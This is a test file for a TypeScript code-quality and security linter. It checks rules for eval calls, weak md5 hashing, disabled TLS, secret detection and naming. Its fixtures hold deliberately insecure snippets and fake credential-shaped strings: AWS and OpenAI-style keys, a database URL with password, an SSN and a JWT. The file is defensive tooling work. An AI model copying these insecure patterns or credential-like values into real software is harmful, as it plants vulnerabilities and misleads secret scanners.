import assert from "node:assert/strict";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer as createNetServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { chdir, cwd } from "node:process";
import test from "node:test";
import { analyse, renderReport, ruleDescriptors } from "./cli.ts";
import type { AnalysisReport } from "./cli.ts";

const REPO_ROOT = cwd();
const HIGH_ENTROPY_FIXTURE_VALUE = ["Zx7pQ9vLm3N8sT2r", "Y6wK1dF4gH5jC0bR2"].join("");
const API_TOKEN_FIXTURE_VALUE = ["rN7pQ4sV9xY2zA5b", "C8dG9hK2mN5pQ8sR1"].join("");
const DATABASE_URL_FIXTURE_VALUE = ["postgres://app:superSecret", "Password@db.internal/app"].join("");
const OPENAI_KEY_FIXTURE_VALUE = ["sk-proj-AbCdEfGhIjKl", "MnOpQrStUvWxYz1234567890"].join("");
const SSN_FIXTURE_VALUE = ["123", "45", "6789"].join("-");
const AWS_ACCESS_KEY_FIXTURE_VALUE = ["AKIAABCDEFGH", "IJKLMNOP"].join("");
const PRIVATE_KEY_HEADER_FIXTURE_VALUE = ["-----BEGIN ", "PRIVATE KEY-----"].join("");
const POSTGRES_URL_FIXTURE_VALUE = ["postgres://user:sec", "ret@example.test/db"].join("");
const JWT_FIXTURE_VALUE = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxMjMifQ", "signature"].join(".");
const TS_IGNORE_DIRECTIVE = ["@ts", "-ignore"].join("");
const COMMENTED_OUT_SECRET_LOAD = ["const", " legacyPassword = loadSecret();"].join("");
const COMMENTED_OUT_CACHE_LOAD = ["const", " disabledCache = loadCache();"].join("");
const COMMENTED_OUT_LEGACY_CALL = ["const", " disabledLegacy = runLegacyPath();"].join("");

const expandedRuleIds = new Set([
  "complexity.npath",
  "docs.fixture-purpose-missing",
  "docs.magic-threshold-without-rationale",
  "docs.missing-error-behavior-doc",
  "docs.missing-file-overview",
  "docs.missing-function-doc",
  "docs.missing-interface-doc",
  "docs.missing-invariant-doc",
  "docs.missing-param-tag",
  "docs.missing-return-tag",
  "docs.missing-side-effect-doc",
  "docs.missing-why-for-complex-code",
  "docs.stale-comment",
  "docs.stale-param-tag",
  "docs.suppression-without-rationale",
  "docs.useless-docblock",
  "docs.todo-without-tracking",
  "design.circular-import",
  "design.deep-relative-import",
  "design.large-module-concentration",
  "design.package-bin-missing",
  "design.package-bin-not-executable",
  "modernisation.date-now-candidate",
  "modernisation.double-cast",
  "modernisation.loose-equality",
  "modernisation.nullish-coalescing-candidate",
  "modernisation.non-null-assertion",
  "modernisation.object-spread-candidate",
  "modernisation.optional-chaining-candidate",
  "modernisation.readonly-property-candidate",
  "modernisation.tsconfig-exact-optional-disabled",
  "modernisation.tsconfig-index-safety-disabled",
  "modernisation.tsconfig-strict-disabled",
  "modernisation.ts-comment-without-rationale",
  "naming.boolean-prefix",
  "naming.class-file-mismatch",
  "naming.hungarian-notation",
  "naming.identifier-quality",
  "security.async-foreach",
  "security.disabled-tls-verification",
  "security.floating-promise",
  "security.insecure-random",
  "security.javascript-url",
  "security.new-function",
  "security.process-exec",
  "security.proto-access",
  "security.remote-install-script",
  "security.sql-concatenation",
  "security.string-timer",
  "security.throw-non-error",
  "security.url-dependency",
  "security.weak-crypto",
  "sensitive-data.api-key-pattern",
  "sensitive-data.hardcoded-env-value",
  "sensitive-data.high-entropy-string",
  "sensitive-data.pii-pattern",
  "test-quality.exception-type-only",
  "test-quality.global-state-mutation",
  "test-quality.magic-number-assertion",
  "test-quality.missing-nearby-test",
  "test-quality.mock-only-test",
  "test-quality.no-throw-only-test",
  "test-quality.setup-bloat",
  "test-quality.snapshot-only-test",
  "test-quality.trivial-assertion",
  "test-quality.unused-mock",
  "waste.commented-out-code",
  "waste.empty-function",
  "waste.exported-any",
  "waste.broad-runtime-version",
  "waste.redundant-boolean-cast",
  "waste.redundant-variable",
  "waste.swallowed-catch",
  "waste.useless-catch",
  "waste.useless-return",
  "waste.unused-import",
  "waste.unused-parameter",
]);

const RULE_QUALITY_FIXTURE_CATEGORIES = ["valid", "invalid", "noisy-valid", "missing-invalid"] as const;

type RuleQualityCategory = (typeof RULE_QUALITY_FIXTURE_CATEGORIES)[number];
type RuleQualityDescriptor = ReturnType<typeof ruleDescriptors>[number];

// Pairs valid, invalid, and noisy fixtures for one rule-doctrine assertion.
interface RuleQualityDoctrineCase {
  ruleId: string;
  signalSource: string;
  expectedPillar: RuleQualityDescriptor["pillar"];
  expectedSeverity: RuleQualityDescriptor["severity"];
  expectedConfidence: RuleQualityDescriptor["confidence"];
  fixtureCategories: readonly RuleQualityCategory[];
  invalidFixture: string;
  noisyValidFixture: string;
  missingInvalidFixture: string;
  falsePositiveEscapeHatch: string;
  fingerprintStability: string;
}

const riskyRuleIdsRequiringNoisyValidProof = [
  "docs.fixture-purpose-missing",
  "docs.magic-threshold-without-rationale",
  "docs.missing-error-behavior-doc",
  "docs.missing-invariant-doc",
  "docs.missing-side-effect-doc",
  "docs.missing-why-for-complex-code",
  "docs.stale-comment",
  "docs.suppression-without-rationale",
  "docs.todo-density",
  "docs.todo-without-tracking",
  "docs.useless-docblock",
  "security.disabled-tls-verification",
  "security.eval-call",
  "security.new-function",
  "security.string-timer",
  "security.inner-html",
  "security.javascript-url",
  "security.process-exec",
  "security.proto-access",
  "security.weak-crypto",
  "sensitive-data.api-key-pattern",
  "sensitive-data.high-entropy-string",
  "test-quality.only-skip",
  "waste.commented-out-code",
] as const;

const riskyRuleQualityDoctrine = [
  {
    ruleId: "docs.fixture-purpose-missing",
    signalSource: "test and fixture file scan for large source literals, generated fixture sources, and fixture-heavy setup blocks",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "large inline source fixture, generated fixture source, or fixture-heavy test setup without a nearby purpose comment",
    noisyValidFixture: "ordinary prose strings, UI text, markdown snippets, snapshots, short code examples, and purpose-commented fixtures",
    missingInvalidFixture: "large scanner-relevant fixture remains reported when unrelated strings and documented fixtures are present",
    falsePositiveEscapeHatch: "scope to test/fixture-like files, require large source-like content or fixture setup signals, and accept bounded purpose markers",
    fingerprintStability: "anchor to the fixture declaration, helper call, or test invocation line rather than fixture body text",
  },
  {
    ruleId: "docs.magic-threshold-without-rationale",
    signalSource: "masked executable-line scan for named threshold constants and threshold() defaults",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "threshold-like numeric constant or config default without nearby rationale",
    noisyValidFixture: "ordinary numeric literals, test assertions, strings, templates, and rationale-commented thresholds",
    missingInvalidFixture: "unexplained threshold remains reported when explained thresholds are nearby",
    falsePositiveEscapeHatch: "skip common safe values and test files, require threshold-like names or threshold() defaults",
    fingerprintStability: "anchor to the numeric policy line and threshold label without including surrounding prose",
  },
  {
    ruleId: "docs.missing-error-behavior-doc",
    signalSource: "commented function body scan for throw, catch, process.exit, diagnostics, or finding pushes",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "commented function with throw/catch/reporting behavior but no error-behavior marker",
    noisyValidFixture: "ordinary pure functions and comments that explicitly mention throws, reports, exits, or recovery",
    missingInvalidFixture: "error behavior remains reported when unrelated useful comments are present",
    falsePositiveEscapeHatch: "require an existing leading comment and bounded observable error-behavior tokens",
    fingerprintStability: "anchor to the leading comment line plus function symbol",
  },
  {
    ruleId: "docs.missing-invariant-doc",
    signalSource: "commented declaration scan for schema, fingerprint, baseline, report, and deterministic contracts",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "commented function or interface that owns schemaVersion or fingerprint fields without invariant wording",
    noisyValidFixture: "contract-bearing comments that mention schema, fingerprint, stable, deterministic, or invariant",
    missingInvalidFixture: "contract-bearing declaration remains reported when unrelated comments are present",
    falsePositiveEscapeHatch: "require an existing leading comment and explicit contract vocabulary in declaration or body",
    fingerprintStability: "anchor to the leading comment line plus declaration symbol",
  },
  {
    ruleId: "docs.missing-side-effect-doc",
    signalSource: "commented function body scan for explicit filesystem, process, environment, server, and child-process APIs",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "commented function that writes files, mutates process state, or spawns a process without naming the side effect",
    noisyValidFixture: "pure parsing/string helpers and comments that explicitly mention writes, persists, spawns, or environment",
    missingInvalidFixture: "observable side effect remains reported when unrelated comments are present",
    falsePositiveEscapeHatch: "do not infer from function names alone except known persistence entry points",
    fingerprintStability: "anchor to the leading comment line plus function symbol",
  },
  {
    ruleId: "docs.missing-why-for-complex-code",
    signalSource: "commented function metrics reused from existing size, cyclomatic, cognitive, NPath, and nesting thresholds",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "commented function over an existing complexity threshold without because/why/tradeoff context",
    noisyValidFixture: "simple commented functions and complex functions whose comments mention why, because, or tradeoffs",
    missingInvalidFixture: "complex control flow remains reported when a restating or generic comment is present",
    falsePositiveEscapeHatch: "missing comments stay owned by docs.missing-function-doc; M32 needs a leading comment",
    fingerprintStability: "anchor to the leading comment line plus function symbol",
  },
  {
    ruleId: "docs.stale-comment",
    signalSource: "comment-text scanner with declaration, rule, flag, and path cross-checks",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "comments naming missing files, unknown rule ids, stale flags, or the wrong declaration",
    noisyValidFixture: "historical comments with legacy or migration context and valid file/rule/flag references",
    missingInvalidFixture: "stale references still report when valid historical context appears nearby",
    falsePositiveEscapeHatch: "skip explicitly historical context and only match narrow quoted paths and known rule prefixes",
    fingerprintStability: "anchor to the comment line rather than the prose body so wording edits do not churn identity",
  },
  {
    ruleId: "docs.suppression-without-rationale",
    signalSource: "comment-text scanner over lint, formatter, coverage, and tool suppression markers",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "eslint, biome, oxlint, coverage, or prettier suppression without because/reason/tracking text",
    noisyValidFixture: "suppression markers with because, reason, false-positive, issue, ADR, or task context",
    missingInvalidFixture: "unexplained suppression remains reported beside documented suppressions",
    falsePositiveEscapeHatch: "TypeScript directives keep the existing modernisation rule to avoid duplicate findings",
    fingerprintStability: "anchor to the suppression comment line and not to the suppression rationale body",
  },
  {
    ruleId: "docs.todo-density",
    signalSource: "comment-text scanner with raw line anchors",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "comment markers over the configured threshold",
    noisyValidFixture: "marker words inside strings, regex bodies, and template text",
    missingInvalidFixture: "real comment markers just below and at threshold",
    falsePositiveEscapeHatch: "count only comment text, not executable literals",
    fingerprintStability: "anchor to the first real marker line",
  },
  {
    ruleId: "docs.todo-without-tracking",
    signalSource: "comment-text scanner requiring issue, owner, date, ADR, milestone, or task tracking markers",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "TODO, FIXME, HACK, or XXX comment with no tracking context",
    noisyValidFixture: "marker words inside strings/templates/regexes plus comments with explicit tracking markers",
    missingInvalidFixture: "untracked marker remains reported when tracked marker examples are present",
    falsePositiveEscapeHatch: "scan extracted comments only and accept bounded tracking patterns",
    fingerprintStability: "anchor to the marker comment line and keep raw TODO text out of the fingerprint",
  },
  {
    ruleId: "docs.useless-docblock",
    signalSource: "leading-comment scanner comparing normalized comment words with declaration names",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "JSDoc or line comment that only repeats the function or interface name",
    noisyValidFixture: "comments that explain contract, side effects, invariants, fallback, or why context",
    missingInvalidFixture: "restating comment remains reported beside useful context comments",
    falsePositiveEscapeHatch: "skip comments with explicit maintainer-context marker phrases",
    fingerprintStability: "anchor to the declaration comment line and symbol, not the full prose",
  },
  {
    ruleId: "security.eval-call",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct eval call in executable code",
    noisyValidFixture: "eval text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "direct eval remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run only against masked executable source",
    fingerprintStability: "keep file path, rule id, executable line, and symbol identity stable",
  },
  {
    ruleId: "security.new-function",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct Function constructor in executable code",
    noisyValidFixture: "constructor text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "constructor call remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run only against masked executable source",
    fingerprintStability: "keep the executable line as the finding anchor",
  },
  {
    ruleId: "security.disabled-tls-verification",
    signalSource: "raw text scan anchored to executable TLS-disable tokens",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "NODE_TLS_REJECT_UNAUTHORIZED zero or rejectUnauthorized false",
    noisyValidFixture: "safe TLS settings and prose references to rejectUnauthorized",
    missingInvalidFixture: "literal TLS-disable tokens remain reported alongside safe settings",
    falsePositiveEscapeHatch: "require an exact disable assignment or object-property value",
    fingerprintStability: "keep the concrete TLS-disable line as the finding anchor",
  },
  {
    ruleId: "security.string-timer",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "timer call with a string callback",
    noisyValidFixture: "timer text inside comments, strings, regex bodies, templates, and arbitrary receiver methods",
    missingInvalidFixture: "string timer remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "require a global or browser timer call with a string-like first argument",
    fingerprintStability: "keep the timer call line as the finding anchor",
  },
  {
    ruleId: "security.inner-html",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "innerHTML assignment in executable code",
    noisyValidFixture: "innerHTML text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "assignment remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "require an executable assignment token",
    fingerprintStability: "keep the assignment line as the finding anchor",
  },
  {
    ruleId: "security.javascript-url",
    signalSource: "raw string-literal scan guarded by executable-code position",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "string literal that begins with javascript:",
    noisyValidFixture: "plain text mentioning javascript URLs in comments or nonmatching strings",
    missingInvalidFixture: "javascript URL literal remains reported with noisy strings present",
    falsePositiveEscapeHatch: "require the javascript: token to start in executable code",
    fingerprintStability: "anchor to the literal line without including the URL body",
  },
  {
    ruleId: "security.process-exec",
    signalSource: "masked source executable-line scan with fixed test harness exemption",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "spawn, exec, or execFile called with runtime-controlled command input",
    noisyValidFixture: "fixed local spawn or execFile command vectors inside test harness files",
    missingInvalidFixture: "dynamic child-process calls remain reported when fixed harnesses are present",
    falsePositiveEscapeHatch: "exempt only fixed local command vectors in test-like files",
    fingerprintStability: "keep the child-process call line as the finding anchor",
  },
  {
    ruleId: "security.proto-access",
    signalSource: "masked executable-line and guarded raw bracket-property scans",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct dot or bracket __proto__ property access",
    noisyValidFixture: "__proto__ text inside comments and unrelated string literals",
    missingInvalidFixture: "direct prototype access remains reported beside noisy strings",
    falsePositiveEscapeHatch: "require a real property access token in code",
    fingerprintStability: "keep the prototype access line as the finding anchor",
  },
  {
    ruleId: "security.weak-crypto",
    signalSource: "raw text scan anchored to executable crypto API tokens",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "md5, sha1, createCipher, or legacy TLS protocol options",
    noisyValidFixture: "sha256 and modern TLS options plus prose references to old algorithms",
    missingInvalidFixture: "weak crypto tokens remain reported with safe crypto nearby",
    falsePositiveEscapeHatch: "require exact weak algorithm or legacy protocol tokens",
    fingerprintStability: "keep the weak crypto line as the finding anchor",
  },
  {
    ruleId: "sensitive-data.high-entropy-string",
    signalSource: "raw text literal scanner with redacted preview metadata",
    expectedPillar: "sensitive-data",
    expectedSeverity: "error",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "secret-like high-entropy literal",
    noisyValidFixture: "package integrity hash and obvious placeholder literals",
    missingInvalidFixture: "secret-like literal remains reported with redacted output",
    falsePositiveEscapeHatch: "allowlist known non-secret encodings before reporting",
    fingerprintStability: "anchor to the literal line without including raw secret text",
  },
  {
    ruleId: "test-quality.only-skip",
    signalSource: "test block scan against masked executable body",
    expectedPillar: "test-quality",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "focused or skipped test marker in executable test code",
    noisyValidFixture: "focused/skipped marker text inside fixtures and documentation",
    missingInvalidFixture: "focused or skipped test remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run against masked test block source only",
    fingerprintStability: "anchor to the test block start line",
  },
  {
    ruleId: "waste.commented-out-code",
    signalSource: "raw line comment scanner",
    expectedPillar: "waste",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "single-line comment that starts with disabled source syntax",
    noisyValidFixture: "ordinary prose comments that mention code tokens",
    missingInvalidFixture: "disabled source line remains reported when prose comments are present",
    falsePositiveEscapeHatch: "require the uncommented text to look like a statement, declaration, or call",
    fingerprintStability: "anchor to the commented-out source line",
  },
] as const satisfies readonly RuleQualityDoctrineCase[];

const riskyRuleQualityExceptions = [
  {
    ruleId: "sensitive-data.api-key-pattern",
    reason:
      "Vendor key patterns intentionally scan raw text so committed secrets in comments, fixtures, and config are still findings; noisy-valid proof is deferred to rule-specific allowlist refinements.",
  },
] as const;

test("analysis finds core TypeScript smells", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string, g: string, h: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f, g, h);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("security.eval-call"), true);
  assert.equal(ruleIds.has("size.parameter-count"), true);
  assert.equal(ruleIds.has("test-quality.no-assertions"), true);
  assert.equal(ruleIds.has("modernisation.public-property"), true);
});

test("existing core fixture fingerprints stay stable", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string, g: string, h: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f, g, h);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const fingerprints = new Map(report.findings.map((finding) => [finding.ruleId, finding.fingerprint]));
  assert.equal(fingerprints.get("security.eval-call"), "9597745a32e48f52");
  assert.equal(fingerprints.get("size.parameter-count"), "d616356804967e11");
  assert.equal(fingerprints.get("test-quality.no-assertions"), "abc482609c475b4f");
  assert.equal(fingerprints.get("modernisation.public-property"), "c80058bf4fd46024");
});

test("analysis finds first-slice portable TypeScript rules", () => {
  const secret = HIGH_ENTROPY_FIXTURE_VALUE;
  // M01 portable rubric map: port-now rules use source-text, line, function-block,
  // test-block, and sensitive-data seams with standalone TypeScript fixtures.
  const report = analyseFixture(`import assert from "node:assert/strict";
import { createHash } from "node:crypto";

const data1 = "placeholder";
const embeddedToken = "${secret}";

// ${COMMENTED_OUT_SECRET_LOAD}
function hashPassword(password: string): string {
  return createHash("md5").update(password).digest("hex");
}

test("trivial assertion", () => {
  assert.equal(1, 1);
});

function testBuildsValue(): void {
  assert.equal("not a test", "not a test");
}
`);
  const firstSliceRuleIds = new Set([
    "waste.commented-out-code",
    "naming.identifier-quality",
    "test-quality.trivial-assertion",
    "security.weak-crypto",
    "sensitive-data.high-entropy-string",
  ]);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of firstSliceRuleIds) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const firstSliceFindings = report.findings.filter((finding) => firstSliceRuleIds.has(finding.ruleId));
  assert.equal(new Set(firstSliceFindings.map((finding) => finding.fingerprint)).size, firstSliceFindings.length);

  const helperTestFindings = report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsValue");
  assert.deepEqual(helperTestFindings, []);

  const secretFinding = report.findings.find((finding) => finding.ruleId === "sensitive-data.high-entropy-string");
  assert.notEqual(secretFinding, undefined);
  assert.equal(secretFinding?.message.includes(secret), false);
  assert.equal(JSON.stringify(secretFinding?.metadata).includes(secret), false);
  assert.match(JSON.stringify(secretFinding?.metadata), /redacted/);
  assert.equal(renderReport(report, "json").includes(secret), false);
});

test("core expansion clean fixture avoids new M02 findings", () => {
  const report = analyseFixture(
    `/** UserProfile stores profile state. */
export class UserProfile {
  public readonly displayName: string;

  public constructor(displayName: string) {
    this.displayName = displayName;
  }

  public getName(account?: { profile?: { name?: string } }, fallbackName?: string): string {
    return account?.profile?.name ?? fallbackName ?? this.displayName;
  }
}

/**
 * Formats a display name.
 * @param displayName Name to format.
 * @returns The formatted display name.
 */
export function formatDisplayName(displayName: string): string {
  return displayName.trim();
}

function combineNames(primaryName: string, secondaryName: string): string {
  return primaryName + secondaryName;
}

function normalizeStatus(status: string): string {
  try {
    if (status.length > 10) {
      return "long";
    }
    switch (status) {
      case "ready":
        return "ready";
      default:
        return status.trim();
    }
  } catch (error) {
    return String(error);
  }
}
`,
    { fileName: "UserProfile.ts" },
  );
  const m02RuleIds = new Set([
    "complexity.npath",
    "waste.commented-out-code",
    "waste.empty-function",
    "waste.redundant-variable",
    "waste.unused-import",
    "waste.unused-parameter",
    "naming.identifier-quality",
    "naming.boolean-prefix",
    "naming.hungarian-notation",
    "naming.class-file-mismatch",
    "docs.stale-param-tag",
    "docs.missing-param-tag",
    "docs.missing-return-tag",
    "docs.useless-docblock",
    "modernisation.readonly-property-candidate",
    "modernisation.optional-chaining-candidate",
    "modernisation.nullish-coalescing-candidate",
  ]);
  const unexpected = report.findings.filter((finding) => m02RuleIds.has(finding.ruleId));
  assert.deepEqual(unexpected, []);
});

test("core expansion finds complexity and waste rules", () => {
  const report = analyseFixture(
    `import { readFileSync, writeFileSync } from "node:fs";

const loadedText = readFileSync("input.txt", "utf8");

function routeOrder(state: string, unusedFlag: boolean): string {
  if (state === "new") {
    return "new";
  }
  if (state === "paid") {
    return "paid";
  }
  if (state === "sent") {
    return "sent";
  }
  if (state === "closed") {
    return "closed";
  }
  if (loadedText.length > 0) {
    return loadedText;
  }
  return "unknown";
}

// ${COMMENTED_OUT_CACHE_LOAD}
function emptyWork(): void {}

function redundantResult(): string {
  const calculatedResult = routeOrder("new", true);
  return calculatedResult;
}
`,
    { config: { rules: { "complexity.npath": { threshold: 20, severity: "warning" } } } },
  );
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "complexity.npath",
    "waste.commented-out-code",
    "waste.empty-function",
    "waste.redundant-variable",
    "waste.unused-import",
    "waste.unused-parameter",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  const npathFinding = report.findings.find((finding) => finding.ruleId === "complexity.npath");
  assert.match(npathFinding?.message ?? "", /capped at/);
  assert.equal(typeof npathFinding?.metadata.npath, "number");
});

test("core expansion respects npath config", () => {
  // Config contract: complexity.npath | threshold/severity | defaults 200/warning |
  // metadata npath,capped,cap | disabled and override fixtures below.
  const source = `function branchLightly(input: string): string {
  if (input === "a") {
    return "a";
  }
  if (input === "b") {
    return "b";
  }
  return "c";
}
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "complexity.npath"), false);

  const tightReport = analyseFixture(source, {
    config: { rules: { "complexity.npath": { threshold: 3, severity: "error" } } },
  });
  assert.equal(tightReport.findings.some((finding) => finding.ruleId === "complexity.npath" && finding.severity === "error"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "complexity.npath": { enabled: false, threshold: 1, severity: "warning" } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "complexity.npath"), false);
});

test("loads default gruff-ts yaml config", () => {
  const report = analyseProject(
    {
      "bad.ts": `function branchLightly(input: string): string {
  if (input === "a") {
    return "a";
  }
  if (input === "b") {
    return "b";
  }
  return "c";
}
`,
      ".gruff-ts.yaml": `
rules:
  "complexity.npath":
    threshold: 3
    severity: warning
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "complexity.npath"), true);
});

test("rule threshold config requires one value and one severity", () => {
  assert.throws(
    () => analyseProject({ "bad.ts": "export const value = 1;\n" }, { config: { rules: { "size.file-length": { threshold: 3 } } } }),
    /threshold" and "severity" must be configured together/,
  );
  assert.throws(
    () => analyseProject({ "bad.ts": "export const value = 1;\n" }, { config: { rules: { "size.file-length": { severity: "warning" } } } }),
    /threshold" and "severity" must be configured together/,
  );
});

test("loads default gruff-ts yaml allowlists", () => {
  const report = analyseProject(
    {
      "bad.ts": `const xy = 1;
console.log(xy);
`,
      ".gruff-ts.yaml": `
allowlists:
  acceptedAbbreviations: [xy]
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "naming.short-variable"), false);
});

test("naming blacklists default to current behavior", () => {
  const report = analyseFixture(`function process(): void {}

function walk(): void {}

const strName = "demo";

const enabled = true;

const value = 1;

console.log(process, walk, strName, enabled, value);
`);

  // Collects finding symbols for one rule in the naming fixture assertions. Keeps rule output deterministic for snapshots.
  const byRule = (id: string) => report.findings.filter((finding) => finding.ruleId === id).map((finding) => finding.symbol);
  assert.deepEqual(byRule("naming.generic-function"), ["process"]);
  assert.deepEqual(byRule("naming.generic-function").includes("walk"), false);
  assert.deepEqual(byRule("naming.hungarian-notation"), ["strName"]);
  assert.deepEqual(byRule("naming.boolean-prefix"), ["enabled"]);
  assert.deepEqual(byRule("naming.identifier-quality"), ["value"]);
});

test("naming blacklists accept config overrides", () => {
  const report = analyseFixture(
    `function process(): void {}

function walk(): void {}

console.log(process, walk);
`,
    { config: { allowlists: { bannedGenericNames: ["walk"] } } },
  );
  const generic = report.findings.filter((finding) => finding.ruleId === "naming.generic-function").map((finding) => finding.symbol);
  assert.deepEqual(generic, ["walk"]);
});

test("naming blacklist disable empties the list", () => {
  const report = analyseFixture(
    `const value = 1;
const foo1 = 2;
console.log(value, foo1);
`,
    { config: { allowlists: { placeholderNames: [] } } },
  );
  const quality = report.findings.filter((finding) => finding.ruleId === "naming.identifier-quality").map((finding) => finding.metadata?.variant);
  assert.deepEqual(quality, ["numbered"]);
});

test("naming blacklists preserve fingerprint identity", () => {
  const report = analyseFixture(`function process(): void {}
console.log(process);
`);
  const finding = report.findings.find((entry) => entry.ruleId === "naming.generic-function" && entry.symbol === "process");
  assert.equal(finding?.fingerprint, "6786a041045d82a8");
});

test("naming short-variable flags single-letter parameter", () => {
  const report = analyseFixture(`function takesOne(x: number): number {
  return x;
}
`);
  const shorts = report.findings.filter((finding) => finding.ruleId === "naming.short-variable");
  assert.equal(shorts.length, 1);
  assert.equal(shorts[0]?.symbol, "x");
  assert.equal(shorts[0]?.metadata?.surface, "parameter");
});

test("naming short-variable flags destructured single-letter", () => {
  const report = analyseFixture(`function unpack(): void {
  const { a, b } = { a: 1, b: 2 };
  console.log(a, b);
}
`);
  const shorts = report.findings.filter((finding) => finding.ruleId === "naming.short-variable" && finding.metadata?.surface === "destructure");
  assert.deepEqual(shorts.map((finding) => finding.symbol).sort(), ["a", "b"]);
});

test("naming identifier-quality flags placeholder parameter", () => {
  const report = analyseFixture(`function takesValue(data: unknown): unknown {
  return data;
}
`);
  const findings = report.findings.filter((finding) => finding.ruleId === "naming.identifier-quality" && finding.metadata?.surface === "parameter");
  assert.deepEqual(findings.map((finding) => finding.symbol), ["data"]);
});

